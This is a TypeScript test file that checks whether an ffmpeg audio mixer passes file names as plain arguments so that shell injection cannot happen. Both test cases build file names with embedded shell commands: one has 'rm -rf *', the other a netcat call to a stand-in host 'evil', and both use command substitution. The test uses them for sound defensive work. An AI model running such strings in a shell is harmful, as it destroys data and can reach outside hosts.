// Adversarial test for S-11 (a shell command injected through a file name into the mixer). The mixer
// runs every ffmpeg and ffprobe call through execFile with an argv array, never a shell string, so a
// path full of shell metacharacters is just a file name, never a command. The no-shell guarantee is
// structural: mix() takes audio bytes plus paths the mixer itself names, never caller text. Here we
// hand it an input whose file name would be catastrophic under a shell and prove it still produces a
// valid MP3 and that no injected command ran. See SECURITY.md.

import { execFile } from "node:child_process";
import { existsSync } from "node:fs";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import { makeFfmpegMixer } from "../adapters/ffmpeg.js";
import type { Logger } from "../contracts.js";

const FFMPEG = "/usr/bin/ffmpeg";
const FFPROBE = "/usr/bin/ffprobe";

// If a shell ever parsed an input file name, a $(touch ...) inside it would create this marker in the
// process working directory. We assert it never appears.
const INJECTION_MARKER = "overhear-shell-injection-must-not-exist";

function run(bin: string, args: readonly string[]): Promise<string> {
  return new Promise((resolve, reject) => {
    execFile(
      bin,
      [...args],
      { maxBuffer: 64 * 1024 * 1024, encoding: "utf8" },
      (err, stdout, stderr) => {
        if (err) reject(new Error(`${bin}: ${String(stderr || err.message)}`));
        else resolve(stdout);
      },
    );
  });
}

async function genSine(file: string, seconds: number, freq: number): Promise<void> {
  await run(FFMPEG, [
    "-nostdin",
    "-hide_banner",
    "-v",
    "error",
    "-y",
    "-f",
    "lavfi",
    "-i",
    `sine=frequency=${freq}:duration=${seconds}`,
    "-c:a",
    "libmp3lame",
    "-b:a",
    "128k",
    file,
  ]);
}

async function probeSeconds(file: string): Promise<number> {
  const out = await run(FFPROBE, [
    "-v",
    "error",
    "-show_entries",
    "format=duration",
    "-of",
    "default=noprint_wrappers=1:nokey=1",
    file,
  ]);
  return Number.parseFloat(out.trim());
}

const nullLogger: Logger = {
  info: () => {},
  warn: () => {},
  error: () => {},
  child: () => nullLogger,
};

let dir = "";
beforeAll(async () => {
  dir = await mkdtemp(join(tmpdir(), "overhear-sec-mix-"));
});
afterAll(async () => {
  if (dir) await rm(dir, { recursive: true, force: true }).catch(() => {});
});
afterEach(async () => {
  // Defensive: the marker must never be created, but remove it if a regression ever does.
  await rm(join(process.cwd(), INJECTION_MARKER), { force: true }).catch(() => {});
});

describe("ffmpeg mixer builds an argv, never a shell string (S-11)", () => {
  it("prepends an intro sting whose file name is full of shell metacharacters", async () => {
    // A legal POSIX file name (no slash, no NUL) that would run commands if it ever hit a shell.
    const evilName = `inj; rm -rf * & echo $(touch ${INJECTION_MARKER}) | tee pwned "q".mp3`;
    const stingFile = join(dir, evilName);
    await genSine(stingFile, 0.5, 330);

    const lineFile = join(dir, "line-0.mp3");
    await genSine(lineFile, 0.7, 440);
    const lines = [{ audio: await readFile(lineFile) }];

    const result = await makeFfmpegMixer(nullLogger).mix({
      lines,
      gapMs: 200,
      introStingPath: stingFile,
    });

    // Real, playable output: the adversarial name was treated as a plain path.
    expect(result.mp3.byteLength).toBeGreaterThan(0);
    const outFile = join(dir, "out-sting.mp3");
    await writeFile(outFile, result.mp3);
    expect(await probeSeconds(outFile)).toBeGreaterThan(0);
    expect(result.lineTimings).toHaveLength(1);

    // No command inside the file name ran.
    expect(existsSync(join(process.cwd(), INJECTION_MARKER))).toBe(false);
  });

  it("lays a ducked bed whose file name is full of shell metacharacters", async () => {
    const bedName = `bed; $(touch ${INJECTION_MARKER}) | nc evil 1 & echo \`whoami\` "q".mp3`;
    const bedFile = join(dir, bedName);
    await genSine(bedFile, 2.0, 180);

    const a = join(dir, "bed-line-0.mp3");
    const b = join(dir, "bed-line-1.mp3");
    await genSine(a, 0.6, 440);
    await genSine(b, 0.8, 520);
    const lines = [{ audio: await readFile(a) }, { audio: await readFile(b) }];

    const result = await makeFfmpegMixer(nullLogger).mix({ lines, gapMs: 150, bedPath: bedFile });

    expect(result.mp3.byteLength).toBeGreaterThan(0);
    const outFile = join(dir, "out-bed.mp3");
    await writeFile(outFile, result.mp3);
    expect(await probeSeconds(outFile)).toBeGreaterThan(0);
    expect(result.lineTimings).toHaveLength(2);

    expect(existsSync(join(process.cwd(), INJECTION_MARKER))).toBe(false);
  });
});
